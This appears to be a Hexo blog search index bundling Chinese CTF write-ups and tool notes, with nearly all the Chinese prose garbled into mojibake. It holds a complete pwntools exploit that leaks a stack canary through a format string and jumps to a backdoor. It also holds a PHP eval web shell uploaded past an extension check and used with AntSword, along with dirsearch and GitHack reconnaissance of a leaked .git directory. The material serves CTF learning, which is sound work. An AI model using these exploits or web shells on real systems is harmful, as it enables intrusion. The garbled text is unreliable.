<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>NewStar2023_Canary</title>
      <link href="/ghsc_ovo_0721/NewStar2023-Canary/"/>
      <url>/ghsc_ovo_0721/NewStar2023-Canary/</url>
      
        <content type="html"><![CDATA[<h2 id="1-Canary-æ˜¯ä»€éº¼ï¼Ÿ"><a href="#1-Canary-æ˜¯ä»€éº¼ï¼Ÿ" class="headerlink" title="1. Canary æ˜¯ä»€éº¼ï¼Ÿ"></a>1. Canary æ˜¯ä»€éº¼ï¼Ÿ</h2><p>Canary (é‡‘çµ²é›€) æ˜¯ä¸€ç¨®ç”¨ä¾†é˜²æ­¢ç·©è¡å€æº¢ä½æ”»æ“Šçš„ä¿è­·æ©Ÿåˆ¶ã€‚ç¨‹å¼æœƒåœ¨å‡½å¼é–‹å§‹æ™‚åœ¨å †ç–Šä¸Šæ”¾ç½®ä¸€å€‹éš¨æ©Ÿçš„å€¼ (Canary)ï¼Œä¸¦åœ¨å‡½å¼è¿”å›å‰æª¢æŸ¥é€™å€‹å€¼æ˜¯å¦è¢«æ”¹è®Šã€‚å¦‚æœè¢«æ”¹è®Šï¼Œè¡¨ç¤ºç™¼ç”Ÿäº†ç·©è¡å€æº¢ä½ï¼Œç¨‹å¼æœƒç«‹å³çµ‚æ­¢ã€‚</p><p>åœ¨ 32 ä½å…ƒç¨‹å¼ä¸­ï¼ŒCanary é€šå¸¸æ˜¯ä¸€å€‹ 4 ä½å…ƒçµ„çš„å€¼ï¼Œä¸¦ä¸”ä»¥ <code>\x00</code> çµå°¾ã€‚å®ƒè¢«æ”¾åœ¨ saved EBP (èˆŠçš„ EBP) å’Œå€åŸŸè®Šæ•¸ä¹‹é–“ã€‚</p><h2 id="2-çœ‹çœ‹ç¨‹å¼çš„è³‡è¨Š"><a href="#2-çœ‹çœ‹ç¨‹å¼çš„è³‡è¨Š" class="headerlink" title="2.çœ‹çœ‹ç¨‹å¼çš„è³‡è¨Š"></a>2.çœ‹çœ‹ç¨‹å¼çš„è³‡è¨Š</h2><img src="925cf0f80b5f3bad48b8b9ca73cf5957.png" alt="925cf0f80b5f3bad48b8b9ca73cf5957.png" /><p>æ˜¯ä¸€å€‹64ä½çš„ELF , é–‹äº†NX å’ŒCANARY å’Œ RELERO</p><p>ä»Šæ¬¡æˆ‘å€‘è¦å­¸ç¿’å¦‚ä½•ç”¨pwndbgä¾†æ‰¾å‡ºcanary</p><p>å…ˆçœ‹çœ‹IDAçš„å½ä»£ç¢¼:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char buf[40]; // [rsp+0h] [rbp-30h] BYREF</span><br><span class="line">  unsigned __int64 v5; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  puts(&quot;Welcome to NewStar CTF!!&quot;);</span><br><span class="line">  puts(&quot;Give me some gift?&quot;);</span><br><span class="line">  read(0, buf, 0x20u);</span><br><span class="line">  puts(&quot;Oh thanks,There is my gift:&quot;);</span><br><span class="line">  printf(buf);</span><br><span class="line">  puts(&quot;Show me your magic&quot;);</span><br><span class="line">  read(0, buf, 0x100u);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹è¦‹æœ‰å…©å€‹readå‡½æ•¸ å’Œä¸€å€‹printfå‡½æ•¸ ,  read(0, buf, 0x20u); ç¬¬ä¸€å€‹çš„readè®€å–20å€‹å­—ç¯€(u) , ç¬¬äºŒå€‹100å­—ç¯€(u) , ç”±æ–¼é–‹äº†NX ä¸èƒ½ç”¨shellcode , è¦ç”¨å¾Œé–€å‡½æ•¸æˆ–ROPéˆ , </p><p>åœ¨IDAç™¼ç¾äº†backdoorå‡½æ•¸:</p><img src="375c9a3e1f280ef206960f1bfaa90216.png" alt="375c9a3e1f280ef206960f1bfaa90216.png" /><img src="91ac1c6d344675c4fdab435647931ac9.png" alt="91ac1c6d344675c4fdab435647931ac9.png" /><p>backdoor : 0x401262 </p><p>æˆ‘å€‘è¦åœ¨printæ‰¾åˆ°canary å†ç”¨recvuntil()æˆªå–åœ°å€ , æœ€å¾Œåœ¨payload ä¸­åŠ å…¥canary</p><p>é¦–å…ˆå«å‡ºå‰å¤§çš„gdbå¤§äºº , ä¸‹ä¸€å€‹æ–·é»åœ¨read å‡½æ•¸é‚£:</p><img src="1543c2757effce1d49829104a1a8b3f0.png" alt="1543c2757effce1d49829104a1a8b3f0.png" /><ol><li>b* main </li><li>b *0x401310</li><li>b *0x401335</li><li>b *0x40135A</li><li>cyclic 20 ç”Ÿæˆä¸€å€‹20å­—ç¯€çš„å­—ç¬¦ä¸² , çœ‹çœ‹cyclic </li><li>stack 30</li></ol><img src="5ff12d98052698996f80eff1c506df62.png" alt="5ff12d98052698996f80eff1c506df62.png" /><p>0x00 æ˜¯ canary å°é‡‘çµ²é³¥æ˜¯00 , ä¸é›£çœ‹ åœ¨ rbp-0x8é‚£æœ‰ä¸€å€‹00 åœ°å€æ˜¯: 0x7fffffffd598</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">05:0028â”‚-008     0x7fffffffd598 â—‚â€” 0x2ae9f13115290200</span><br></pre></td></tr></table></figure><p>åœ¨gdb canaryä¸€ä¸‹æ²’å‡ºä¾† :<br><img src="07b6e380a5d375a6276f404ec46e2f42.png" alt="07b6e380a5d375a6276f404ec46e2f42.png" /></p><p>â€“all ä¸€ä¸‹ : å‡ºä¾†æ</p><img src="078ebb6ca03cf8249cb81d4562e25bef.png" alt="078ebb6ca03cf8249cb81d4562e25bef.png" /><p>åœ¨-008é‚£ , é‚£éº¼ç®—ä¸€ç®—åç§»é‡:  5 </p><img src="67d1a20f339b7c34c181e34ab985583b.png" alt="67d1a20f339b7c34c181e34ab985583b.png" /><img src="8d0f4205b9f19924d5d45ed3846f9121.png" alt="8d0f4205b9f19924d5d45ed3846f9121.png" /><p>16*6 æ˜¯canary , &#x2F;16 &#x3D; 6 </p><p>ä¸é›£çœ‹å‡ºå­—ç¬¦ä¸²åç§»é‡ç‚º6 , 6+5 &#x3D; %11$p</p><p>ç¾åœ¨å¯«ä¸€å¯«payloadæ€è·¯ :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">b&#x27;aaaaaa %11$p&#x27;</span>)</span><br></pre></td></tr></table></figure><img src="ffa12e0ad0da22c35e68de34f82120e3.png" alt="ffa12e0ad0da22c35e68de34f82120e3.png" /><p>æˆåŠŸæ‰“å°å‡ºä¾†äº† , </p><img src="55b2f70596f9090b7b0ab3303559a784.png" alt="55b2f70596f9090b7b0ab3303559a784.png" /><p>é‚£æˆ‘å¯ä»¥å¯«ä¸€ä¸‹payload äº† , åƒåœ¾æ•¸æ“š+canary+rbp(0x8)+è¿”å›åœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x98</span>-<span class="number">0x70</span>)+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(shell_addr)</span><br></pre></td></tr></table></figure><br/><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;node5.anna.nssctf.cn&#x27;, 22047)</span></span><br><span class="line">p = process(<span class="string">&quot;./canary&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./canary&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line"></span><br><span class="line">shell_addr = <span class="number">0x401262</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Give me some gift?&#x27;</span>,<span class="string">b&#x27;aaaaa%11$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaaa&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;00&#x27;</span>).decode(),<span class="number">16</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x98</span>-<span class="number">0x70</span>) + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(shell_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Show me your magic&#x27;</span> , payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><img src="f71571a040bd1bfb5e48831796692882.png" alt="f71571a040bd1bfb5e48831796692882.png" /><img src="9e6b1f0ce6cc87c18d40d490fbac1cde.png" alt="9e6b1f0ce6cc87c18d40d490fbac1cde.png" />]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Fridaä½¿ç”¨</title>
      <link href="/ghsc_ovo_0721/Frida%E4%BD%BF%E7%94%A8/"/>
      <url>/ghsc_ovo_0721/Frida%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>frida æ˜¯ä¸€æ¬¾åŸºäº python+javascript çš„ hook æ¡†æ¶ï¼Œå¯è¿è¡Œåœ¨ androidã€iosã€linuxã€winç­‰å„ä¸ªå¹³å°ï¼Œä¸»è¦ä½¿ç”¨çš„åŠ¨æ€äºŒè¿›åˆ¶æ’æ¡©æŠ€æœ¯ã€‚</p><p>æˆ‘å®‰è£åœ¨win conda frida_env é‚£</p><p><a href="https://">https://mumu.163.com/help/20220721/35047_730476.html</a></p><img src="87116c7103ef679365debd9886ff7240.png" alt="87116c7103ef679365debd9886ff7240.png" /><p>E:\mumu\MuMuPlayer\nx_device\12.0\shell</p><p>adb connect 127.0.0.1:5555</p><p>E:\mumu\MuMuPlayer\nx_device\12.0\shell&gt;adb devices<br>List of devices attached<br>127.0.0.1:5555  device<br>emulator-5554   device</p><p>E:\mumu\MuMuPlayer\nx_device\12.0\shell&gt;adb -s 127.0.0.1:5555 shell getprop ro.product.cpu.abi<br>x86_64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb -s 127.0.0.1:5555 push æœ¬åœ°æ–‡ä»¶ /sdcard/</span><br><span class="line">adb -s 127.0.0.1:5555 pull /sdcard/æ–‡ä»¶ æœ¬åœ°è·¯å¾„</span><br><span class="line">E:/BaiduNetdiskDownload/frida-server64/frida-server64 /sdcard/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">adb -s 127.0.0.1:5555 shell</span><br><span class="line">#1. è¿›å…¥ADB Shell</span><br><span class="line">su</span><br><span class="line">mv /sdcard/frida-server64 /data/local/tmp/</span><br><span class="line">chmod 755 /data/local/tmp/frida-server64</span><br><span class="line">ls -la /data/local/tmp/frida-server64</span><br><span class="line">cd /data/local/tmp</span><br><span class="line">./frida-server64 &amp;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ¯æ¬¡é‡å¯æ¨¡æ‹Ÿå™¨åéœ€è¦é‡æ–°è¿è¡Œ ./frida-server64 &amp;</span><br></pre></td></tr></table></figure><br/><h2 id="æˆ‘çš„å•Ÿå‹•"><a href="#æˆ‘çš„å•Ÿå‹•" class="headerlink" title="æˆ‘çš„å•Ÿå‹•"></a>æˆ‘çš„å•Ÿå‹•</h2><h3 id="ğŸ“‹-å‰ç½®æº–å‚™"><a href="#ğŸ“‹-å‰ç½®æº–å‚™" class="headerlink" title="ğŸ“‹ å‰ç½®æº–å‚™"></a>ğŸ“‹ å‰ç½®æº–å‚™</h3><ol><li>ç¢ºä¿MuMuæ¨¡æ“¬å™¨å·²é–‹å•Ÿ</li><li>ç¢ºèªADBå·¥å…·å¯ç”¨</li></ol><h3 id="ğŸ”„-é€£æ¥æ­¥é©Ÿ"><a href="#ğŸ”„-é€£æ¥æ­¥é©Ÿ" class="headerlink" title="ğŸ”„ é€£æ¥æ­¥é©Ÿ"></a>ğŸ”„ é€£æ¥æ­¥é©Ÿ</h3><p>æ­¥é©Ÿ1ï¼šé€£æ¥MuMuæ¨¡æ“¬å™¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd E:\mumu\MuMuPlayer\nx_device\12.0\shell</span><br><span class="line">adb connect 127.0.0.1:5555</span><br></pre></td></tr></table></figure><p>æ­¥é©Ÿ2ï¼šé€²å…¥ADB Shellä¸¦å•Ÿå‹•frida-server</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">adb -s 127.0.0.1:5555 shell</span><br><span class="line">su</span><br><span class="line">cd /data/local/tmp</span><br><span class="line">./frida-server64 &amp;</span><br></pre></td></tr></table></figure><p>æ­¥é©Ÿ3ï¼šé©—è­‰frida-serveré‹è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps | grep frida</span><br></pre></td></tr></table></figure><p>æ­¥é©Ÿ4ï¼šåœ¨æ–°CMDçª—å£æ¸¬è©¦Frida</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conda activate frida_env</span><br><span class="line">frida-ps -U</span><br></pre></td></tr></table></figure><p>å¦‚æœç‰ˆæœ¬ä¸åŒ¹é…ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install frida==16.7.10</span><br><span class="line">pip install frida-tools==16.7.10</span><br></pre></td></tr></table></figure><h3 id="ğŸ¯-å¸¸ç”¨Fridaå‘½ä»¤"><a href="#ğŸ¯-å¸¸ç”¨Fridaå‘½ä»¤" class="headerlink" title="ğŸ¯ å¸¸ç”¨Fridaå‘½ä»¤"></a>ğŸ¯ å¸¸ç”¨Fridaå‘½ä»¤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -U                    # åˆ—å‡ºé€²ç¨‹</span><br><span class="line">frida-ps -Uai                  # åˆ—å‡ºå·²å®‰è£æ‡‰ç”¨</span><br><span class="line">frida -U -f com.example.app    # å•Ÿå‹•ä¸¦é™„åŠ æ‡‰ç”¨</span><br><span class="line">frida-ls-devices               # åˆ—å‡ºè¨­å‚™</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> RE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ROPgadget ä½¿ç”¨</title>
      <link href="/ghsc_ovo_0721/ROPgadget%20%E4%BD%BF%E7%94%A8/"/>
      <url>/ghsc_ovo_0721/ROPgadget%20%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>å®‰è£:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-capstone</span><br><span class="line"> </span><br><span class="line">git clone https://github.com/JonathanSalwan/ROPgadget.git</span><br><span class="line"> </span><br><span class="line">cd ROPgadget</span><br><span class="line"> </span><br><span class="line">sudo python3 setup.py install</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br><span class="line">æŸ¥æ‰¾å¯å­˜å‚¨å¯„å­˜å™¨çš„ä»£ç </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --string &quot;/bin/sh&quot;</span><br><span class="line">æŸ¥æ‰¾å­—ç¬¦ä¸²</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only &#x27;int&#x27;</span><br><span class="line">æŸ¥æ‰¾æœ‰int 0x80çš„åœ°å€</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>dirsearchä½¿ç”¨</title>
      <link href="/ghsc_ovo_0721/dirsearch%E4%BD%BF%E7%94%A8/"/>
      <url>/ghsc_ovo_0721/dirsearch%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target     //ç®€å•çš„æŸ¥çœ‹ç½‘å€ç›®å½•å’Œæ–‡ä»¶</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt        //ä½¿ç”¨æ–‡ä»¶æ‹“å±•åä¸ºphp,txt,zipçš„å­—å…¸æ‰«æç›®æ ‡url</span><br><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --recursive -R 2</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --recursive -R 4 --scan-subdirs=/,/wp-content/,/wp-admin/</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --exclude-texts=This,AndThat</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt -H &quot;User-Agent: IE&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://xxxx        //æ—¥å¸¸ä½¿ç”¨</span><br><span class="line"></span><br><span class="line">python dirsearch.py -u http://xxxx -r        //é€’å½’æ‰«æï¼Œä¸è¿‡å®¹æ˜“è¢«æ£€æµ‹</span><br><span class="line"></span><br><span class="line">python dirsearch.py -u http://xxxx -r -t 30        //çº¿ç¨‹æ§åˆ¶è¯·æ±‚é€Ÿç‡</span><br><span class="line"></span><br><span class="line">python dirsearch.py -u http://xxxx -r -t 30 --proxy 127.0.0.1:8080        //ä½¿ç”¨ä»£ç†</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>(WEB)2025 SWPU-NSSCTF ç§‹å­£æ‹›æ–°å…¥é—¨è®­ç»ƒèµ› ak</title>
      <link href="/ghsc_ovo_0721/WEB-2025-SWPU-NSSCTF-%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E5%85%A5%E9%97%A8%E8%AE%AD%E7%BB%83%E8%B5%9B/"/>
      <url>/ghsc_ovo_0721/WEB-2025-SWPU-NSSCTF-%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E5%85%A5%E9%97%A8%E8%AE%AD%E7%BB%83%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="2025-SWPU-NSSCTF-ç§‹å­£æ‹›æ–°å…¥é—¨è®­ç»ƒèµ›"><a href="#2025-SWPU-NSSCTF-ç§‹å­£æ‹›æ–°å…¥é—¨è®­ç»ƒèµ›" class="headerlink" title="2025 SWPU-NSSCTF ç§‹å­£æ‹›æ–°å…¥é—¨è®­ç»ƒèµ›"></a><strong>2025 SWPU-NSSCTF ç§‹å­£æ‹›æ–°å…¥é—¨è®­ç»ƒèµ›</strong></h1><p>ä½œè€…ï¼šghsc</p><h2 id="1-gift-F12"><a href="#1-gift-F12" class="headerlink" title="1.gift_F12"></a>1.gift_F12</h2><p>ç°½åˆ°é¡Œ!!!! æŒ‰F12</p><img src="ea1d840fdce1643f0679f8441d42a454.png" alt="ea1d840fdce1643f0679f8441d42a454.png" /><p>æŠŠWLLMCTFæ›æˆNSSCTFæäº¤ </p><h2 id="2-Do-you-know-http"><a href="#2-Do-you-know-http" class="headerlink" title="2.Do_you_know_http"></a>2.Do_you_know_http</h2><img src="15a6aa5a5d627d7c6c6af2cbf3a3580c.png" alt="15a6aa5a5d627d7c6c6af2cbf3a3580c.png" /><p>è¦ç”¨bpæŠ“åŒ… , å¯ä»¥çœ‹åˆ°å‡ºç¾äº† Please use â€˜WLLMâ€™ browser! åœ¨bpä¸Šé–‹å•ŸRepeater , ç„¶å¾ŒæŠŠåŒ…ä¸­çš„Uesr-Agent æ–¹å¼æ”¹æˆWLLM</p><img src="a087106c7ae1afb280efa8de4e9bda56.png" alt="a087106c7ae1afb280efa8de4e9bda56.png" /><p>Sendå¾Œæœå‹™å™¨è¿”å›äº†.&#x2F;a.php , å¯ä»¥æŠŠ&#x2F;hello.php æ”¹æˆa.php å†Send </p><img src="8ada2a790db134c7885a3af35606f208.png" alt="8ada2a790db134c7885a3af35606f208.png" /><p>è¦åœ¨æœ¬åœ°æ‰å¯ä»¥read  , æ‰€ä»¥åœ¨åŒ…ä¸­åŠ å…¥ X-Forwarded-For:127.0.0.1</p><img src="93bfd15a54a6d67530a5982cd73dc321.png" alt="93bfd15a54a6d67530a5982cd73dc321.png" /><p>è¿”å›äº†ä¸€å€‹&#x2F;secretttt.php , å†ä¾†æŠŠa.php æ”¹æˆ secretttt.php ,å¾—å‡ºflag </p><img src="1c642baa4c8ccf941b8062e36b97b514.png" alt="1c642baa4c8ccf941b8062e36b97b514.png" /><h2 id="3-WebFTP"><a href="#3-WebFTP" class="headerlink" title="3.WebFTP"></a>3.WebFTP</h2><img src="311fa37e164eb8b923532fe5b20faca2.png" alt="311fa37e164eb8b923532fe5b20faca2.png" /><p>ä½¿ç”¨kali ä¸­çš„dirsearch æ‰«æ , åœ¨kali ä¸­æ‰“å…¥ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch python.py -u http://node7.anna.nssctf.cn:29562/?m=login&amp;a=in</span><br></pre></td></tr></table></figure><img src="9a10db4e14ad10f73bf3f6772c0f6ef6.png" alt="9a10db4e14ad10f73bf3f6772c0f6ef6.png" /><p>å­˜åœ¨gitæ³„éœ² , ä½¿ç”¨GitHack ä¸‹è¼‰å…‹éš†ç›®å½•</p><img src="01adb43f1c64d8cfb3d9d1ba1fe3d795.png" alt="01adb43f1c64d8cfb3d9d1ba1fe3d795.png" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 GitHack.py http://node7.anna.nssctf.cn:29562/?m=login&amp;a=in/.git</span><br></pre></td></tr></table></figure><img src="05b1101fe54144c815914cdf75f0c960.png" alt="05b1101fe54144c815914cdf75f0c960.png" /><p>ç©ºä»“åº“ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><img src="84fe613a7014ffd37f31a06bb249307f.png" alt="84fe613a7014ffd37f31a06bb249307f.png" /><p>æœ€å¾Œåœ¨phpinfo.phpä¸­æ‰¾åˆ°äº†flag ã€‚ã€‚</p><img src="a1d0e26387232549f1c999611ef7a649.png" alt="a1d0e26387232549f1c999611ef7a649.png" /><h2 id="4-jicao"><a href="#4-jicao" class="headerlink" title="4.jicao"></a>4.jicao</h2><p>è¿™é“é¢˜æ˜¯ä¸€ä¸ªphpä»£ç å®¡è®¡é¢˜ç›®</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="title function_">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">$id=$_POST[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$json=<span class="title function_">json_decode</span>($_GET[<span class="string">&#x27;json&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> ($id==<span class="string">&quot;wllmNB&quot;</span>&amp;&amp;$json[<span class="string">&#x27;x&#x27;</span>]==<span class="string">&quot;wllm&quot;</span>)</span><br><span class="line">&#123;echo $flag;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨HackBar , POST  æ–¹æ³•æ˜¯ id &#x3D; wllmNB , GET æ–¹æ³•æ˜¯ json &#x3D; {â€œxâ€:â€wllmâ€}  (é€™æ˜¯json çš„GETæ–¹å¼)</p><img src="8eb0cc113238d50d6b4d6f73a89095f8.png" alt="8eb0cc113238d50d6b4d6f73a89095f8.png" /><br/><h2 id="5-easyupload1-0"><a href="#5-easyupload1-0" class="headerlink" title="5.easyupload1.0"></a>5.easyupload1.0</h2><img src="3c3df1f679fa27534846b37c7c7b74c9.png" alt="3c3df1f679fa27534846b37c7c7b74c9.png" /><p>æŠŠä¸€å¥è©±æœ¨é¦¬upload ä¸Šå» , ç„¶å¾Œç”¨BPæ””ä¸‹åŒ…è½‰å»Repeater ..&#x2F;.</p><p>ä¸€å¥è©±æœ¨é¦¬:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">BM</span></span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt; @<span class="built_in">eval</span>($_POST[<span class="string">&#x27;bhxdn&#x27;</span>]); <span class="title function_">phpinfo</span>();&lt;/script&gt;</span><br></pre></td></tr></table></figure><img src="44222a75c8417886544b761b68f7f345.png" alt="44222a75c8417886544b761b68f7f345.png" /><p>æŠŠ filename ç”±jpg æ”¹æˆ php ç„¶å¾Œç™¼é€</p><img src="e78ca8c5602c8a8b4b58322e042c57ab.png" alt="e78ca8c5602c8a8b4b58322e042c57ab.png" /><p>ç™¼é€æˆåŠŸ ,  åœ¨.&#x2F;upload&#x2F;xiaoma.php ä¸‹ , å¯ä»¥çœ‹è¦‹æ˜¯è§¸ç™¼äº†æœ¨é¦¬çš„ </p><img src="c65d3a42a9304b40d43ff0a3e55c1bf6.png" alt="c65d3a42a9304b40d43ff0a3e55c1bf6.png" /><p>ç„¶å¾Œå¯ä»¥é–‹antsword add URL </p><img src="f8163c307de9b0d00ede75a327993126.png" alt="f8163c307de9b0d00ede75a327993126.png" /><p>å¯ä»¥å›åˆ°htmlä¸‹æ‰¾åˆ°flag </p><img src="f03d9d2819fbfc38b994b755f6b73674.png" alt="f03d9d2819fbfc38b994b755f6b73674.png" /><p>flag ç‚º????????? WLLMCTF{I_d0nt_w4nna_wak3up} ???????,è¨˜å¾—æŠŠå‰é ­æ”¹æˆ NSSCTF{â€¦} </p><p>å¯æ˜¯flagä¸æ­£ç¢ºã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚åœ¨æ ¹ç›®éŒ„éƒ½æ²’æœ‰</p><p>åœ¨æ ¹ç›®éŒ„ä¸‹æ‰“é–‹cmd  æ‰“ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printenv</span><br></pre></td></tr></table></figure><p>å°±æœ‰</p><img 